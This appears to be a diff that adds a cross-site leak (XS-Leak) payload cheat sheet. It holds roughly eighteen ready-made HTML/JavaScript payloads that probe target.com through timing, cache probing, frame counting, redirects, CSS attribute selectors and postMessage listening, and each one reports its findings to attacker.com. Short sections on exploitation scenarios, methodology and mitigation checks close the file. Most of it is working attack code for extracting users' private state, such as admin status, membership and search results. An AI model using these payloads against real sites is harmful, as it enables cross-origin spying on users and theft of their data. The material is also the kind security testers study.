@@ -1,0 +1,404 @@
+# XS-Leak (Cross-Site Leaks) Payloads
+
+## ========================================
+## TIMING ATTACKS
+## ========================================
+
+# Measure response time
+<script>
+var start = performance.now();
+fetch('http://target.com/search?q=admin', {mode: 'no-cors'})
+  .finally(() => {
+    var time = performance.now() - start;
+    // Send timing to attacker
+    fetch('http://attacker.com/log?time=' + time);
+  });
+</script>
+
+## ========================================
+## FRAME COUNTING
+## ========================================
+
+# Count frames in response
+<script>
+var win = window.open('http://target.com/search?q=secret');
+setTimeout(() => {
+  var frameCount = win.frames.length;
+  fetch('http://attacker.com/log?frames=' + frameCount);
+  win.close();
+}, 1000);
+</script>
+
+## ========================================
+## ERROR EVENTS
+## ========================================
+
+# Detect errors vs success
+<script>
+var img = new Image();
+img.onload = () => fetch('http://attacker.com/log?status=success');
+img.onerror = () => fetch('http://attacker.com/log?status=error');
+img.src = 'http://target.com/profile/picture';
+</script>
+
+## ========================================
+## CACHE PROBING
+## ========================================
+
+# Detect if resource cached
+<script>
+function probe(url) {
+  var start = performance.now();
+  fetch(url, {mode: 'no-cors', cache: 'force-cache'})
+    .finally(() => {
+      var time = performance.now() - start;
+      if (time < 10) {
+        // Resource was cached (user visited before)
+        fetch('http://attacker.com/log?cached=' + url);
+      }
+    });
+}
+
+probe('http://target.com/admin/panel.css');
+</script>
+
+## ========================================
+## WINDOW.OPENER
+## ========================================
+
+# Detect navigation
+<script>
+var win = window.open('http://target.com/check-admin');
+var interval = setInterval(() => {
+  try {
+    if (win.location.href !== 'http://target.com/check-admin') {
+      // Redirect occurred (user is admin)
+      fetch('http://attacker.com/log?admin=true');
+      clearInterval(interval);
+    }
+  } catch(e) {
+    // Cross-origin, still loading
+  }
+}, 100);
+</script>
+
+## ========================================
+## RESOURCE TIMING
+## ========================================
+
+# Performance API
+<script>
+performance.clearResourceTimings();
+fetch('http://target.com/api/data', {mode: 'no-cors'})
+  .finally(() => {
+    var resources = performance.getEntriesByType('resource');
+    var timing = resources[resources.length - 1];
+    fetch('http://attacker.com/log?duration=' + timing.duration);
+  });
+</script>
+
+## ========================================
+## CONTENT-LENGTH DETECTION
+## ========================================
+
+# Infer response size via timing
+<script>
+var sizes = {};
+function measureSize(url, id) {
+  var start = performance.now();
+  fetch(url, {mode: 'no-cors'})
+    .finally(() => {
+      sizes[id] = performance.now() - start;
+    });
+}
+
+measureSize('http://target.com/search?q=a', 'a');
+measureSize('http://target.com/search?q=admin', 'admin');
+
+setTimeout(() => {
+  if (sizes['admin'] > sizes['a']) {
+    // "admin" returned more results
+    fetch('http://attacker.com/log?found=admin');
+  }
+}, 2000);
+</script>
+
+## ========================================
+## REDIRECT DETECTION
+## ========================================
+
+# Detect redirect behavior
+<script>
+var iframe = document.createElement('iframe');
+iframe.src = 'http://target.com/members-only';
+document.body.appendChild(iframe);
+
+setTimeout(() => {
+  try {
+    var url = iframe.contentWindow.location.href;
+    if (url.includes('/login')) {
+      // Not a member
+      fetch('http://attacker.com/log?member=false');
+    }
+  } catch(e) {
+    // Still on members page (is a member)
+    fetch('http://attacker.com/log?member=true');
+  }
+}, 1000);
+</script>
+
+## ========================================
+## DOWNLOAD DETECTION
+## ========================================
+
+# Detect if file downloadable
+<script>
+var a = document.createElement('a');
+a.href = 'http://target.com/secret-document.pdf';
+a.download = 'test.pdf';
+a.click();
+
+// Monitor if download started
+setTimeout(() => {
+  // Check if file was downloadable
+  fetch('http://attacker.com/log?downloadable=yes');
+}, 500);
+</script>
+
+## ========================================
+## EVENT TIMING
+## ========================================
+
+# onload vs onerror timing
+<script>
+var start = performance.now();
+var script = document.createElement('script');
+script.onload = () => {
+  var time = performance.now() - start;
+  fetch('http://attacker.com/log?loaded&time=' + time);
+};
+script.onerror = () => {
+  var time = performance.now() - start;
+  fetch('http://attacker.com/log?error&time=' + time);
+};
+script.src = 'http://target.com/api/data.js';
+document.body.appendChild(script);
+</script>
+
+## ========================================
+## CSS INJECTION
+## ========================================
+
+# Leak data via CSS
+<style>
+@import url('http://attacker.com/log?step=1');
+input[value^="a"] {
+  background: url('http://attacker.com/leak?char=a');
+}
+input[value^="b"] {
+  background: url('http://attacker.com/leak?char=b');
+}
+/* ... for all characters */
+</style>
+<iframe src="http://target.com/search"></iframe>
+
+## ========================================
+## POSTMESSAGE LEAKS
+## ========================================
+
+# Listen for postMessage
+<script>
+window.addEventListener('message', (event) => {
+  if (event.origin === 'http://target.com') {
+    fetch('http://attacker.com/leak?data=' + event.data);
+  }
+});
+
+var iframe = document.createElement('iframe');
+iframe.src = 'http://target.com/messenger';
+document.body.appendChild(iframe);
+</script>
+
+## ========================================
+## HISTORY LENGTH
+## ========================================
+
+# Detect history length
+<script>
+var initialLength = history.length;
+var win = window.open('http://target.com/navigate');
+
+setTimeout(() => {
+  if (history.length > initialLength) {
+    // Navigation occurred
+    fetch('http://attacker.com/log?navigated=true');
+  }
+  win.close();
+}, 2000);
+</script>
+
+## ========================================
+## BROWSER CACHE TIMING
+## ========================================
+
+# Advanced cache timing
+<script>
+function cacheProbe(url) {
+  return new Promise((resolve) => {
+    var img = new Image();
+    var start = performance.now();
+    img.onload = img.onerror = () => {
+      var time = performance.now() - start;
+      resolve(time);
+    };
+    img.src = url + '?cache_bust=' + Math.random();
+  });
+}
+
+async function detect() {
+  // First load (cache miss)
+  await cacheProbe('http://target.com/admin.png');
+  
+  // Second load (cache hit if accessible)
+  var time = await cacheProbe('http://target.com/admin.png');
+  
+  if (time < 50) {
+    // Cached = accessible = user is admin
+    fetch('http://attacker.com/log?admin=true');
+  }
+}
+
+detect();
+</script>
+
+## ========================================
+## SERVICE WORKER DETECTION
+## ========================================
+
+# Detect installed service worker
+<script>
+navigator.serviceWorker.getRegistrations()
+  .then(registrations => {
+    if (registrations.length > 0) {
+      fetch('http://attacker.com/log?sw=installed');
+    }
+  });
+</script>
+
+## ========================================
+## SCROLL DETECTION
+## ========================================
+
+# Detect scroll position changes
+<script>
+var iframe = document.createElement('iframe');
+iframe.src = 'http://target.com/search?q=secret#result';
+document.body.appendChild(iframe);
+
+setTimeout(() => {
+  try {
+    if (iframe.contentWindow.scrollY > 0) {
+      // Scrolled to anchor = result found
+      fetch('http://attacker.com/log?found=true');
+    }
+  } catch(e) {}
+}, 1000);
+</script>
+
+## ========================================
+## FONT DETECTION
+## ========================================
+
+# Detect if specific font loads
+<style>
+@font-face {
+  font-family: 'Target';
+  src: url('http://target.com/font.woff');
+}
+</style>
+<script>
+var div = document.createElement('div');
+div.style.fontFamily = 'Target';
+div.textContent = 'Test';
+document.body.appendChild(div);
+
+setTimeout(() => {
+  var width = div.offsetWidth;
+  fetch('http://attacker.com/log?width=' + width);
+}, 500);
+</script>
+
+## ========================================
+## EXPLOITATION SCENARIOS
+## ========================================
+
+# Scenario 1: Admin detection
+Measure timing of /admin page load
+Faster = not admin (redirect to login)
+Slower = admin (page loads)
+
+# Scenario 2: Search results
+Count frames or measure size
+Infer number of results
+
+# Scenario 3: User enumeration
+Check if profile exists
+Error vs success response
+
+## ========================================
+## TESTING METHODOLOGY
+## ========================================
+
+# 1. Identify leak vectors
+- Timing differences
+- Error states
+- Cache behavior
+
+# 2. Create PoC
+- Measure leak
+- Confirm reproducibility
+
+# 3. Exploit
+- Extract sensitive info
+- Enumerate users/data
+
+## ========================================
+## TOOLS
+## ========================================
+
+# XS-Leaks Wiki
+https://xsleaks.dev
+
+# Browser DevTools
+Performance tab
+Network tab
+
+# Custom scripts
+Timing measurement
+Cache probing
+
+## ========================================
+## MITIGATION TESTING
+## ========================================
+
+# Check for:
+- [ ] Consistent response times
+- [ ] SameSite cookies
+- [ ] CORP/COEP headers
+- [ ] Fetch metadata
+- [ ] Partitioned caches
+
+## ========================================
+## ADVANCED TECHNIQUES
+## ========================================
+
+# Combine multiple leaks
+Cache + Timing + Error states
+
+# Statistical analysis
+Multiple measurements
+Average results
+
+# Noise reduction
+Filter outliers
+Repeat measurements
